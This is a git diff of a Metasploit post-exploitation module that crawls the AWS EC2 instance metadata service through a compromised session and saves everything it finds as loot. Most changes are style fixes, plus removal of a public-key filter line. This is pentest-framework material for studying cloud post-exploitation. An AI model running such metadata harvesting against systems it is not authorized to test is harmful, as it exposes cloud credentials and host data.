@@ -6,16 +6,15 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Post
-
   def initialize(info = {})
     super(
       update_info(
         info,
         'Name'          => 'Enumerate AWS EC2 instance metadata',
-        'Description'   => %q{
+        'Description'   => %q(
           This module will attempt to connect to the AWS EC2 instance metadata service
           and crawl and collect all metadata known about the session'd host.
-        },
+    ),
         'License'       => MSF_LICENSE,
         'Author'        => [
           'Jon Hart <jon_hart[at]rapid7.com>' # original metasploit module
@@ -23,7 +22,7 @@ class MetasploitModule < Msf::Post
         # TODO: is there a way to do this on Windows?
         'Platform'      => %w(linux osx unix),
         'SessionTypes'  => %w(shell meterpreter),
-        'References'   =>
+        'References'    =>
           [
             [ 'URL', 'http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html' ]
           ]
@@ -46,7 +45,7 @@ class MetasploitModule < Msf::Post
   end
 
   def check_curl
-    unless cmd_exec("curl --version") =~ /^curl \d/
+    unless cmd_exec("curl --version") =~ %r{^curl \d}
       fail_with(Failure::BadConfig, 'curl is not installed')
     end
   end
@@ -63,11 +62,10 @@ class MetasploitModule < Msf::Post
     r = {}
     base_resp.split(/\r\n/).each do |l|
       new_uri = base_uri.merge("./#{l}")
-      next unless new_uri.to_s =~ /public-key/
-      if l =~ /\/$/
+      if l =~ %r{/$}
         # handle a directory
-        r[l.gsub(/\/$/, '')] = get_aws_metadata(new_uri, simple_get(new_uri))
-      elsif new_uri.to_s =~ /\/public-keys\// && /^(?<key_id>\d+)=/ =~ l
+        r[l.gsub(%r{/$}, '')] = get_aws_metadata(new_uri, simple_get(new_uri))
+      elsif new_uri.to_s =~ %r{/public-keys/} && /^(?<key_id>\d+)=/ =~ l
         # special case handling of the public-keys endpoint
         key_uri = new_uri.merge("./#{key_id}/")
         key_resp = simple_get(key_uri)
@@ -88,7 +86,7 @@ class MetasploitModule < Msf::Post
     check_curl
     resp = check_aws_metadata
     metadata = get_aws_metadata(target_uri, resp)
-    metadata_json =JSON.pretty_generate(metadata)
+    metadata_json = JSON.pretty_generate(metadata)
     file = store_loot("aws.ec2.instance.metadata", "text/json", session, metadata_json, "aws_ec2_instance_metadata.json", "AWS EC2 Instance Metadata")
     if datastore['VERBOSE']
       vprint_good("AWS EC2 instance metadata")
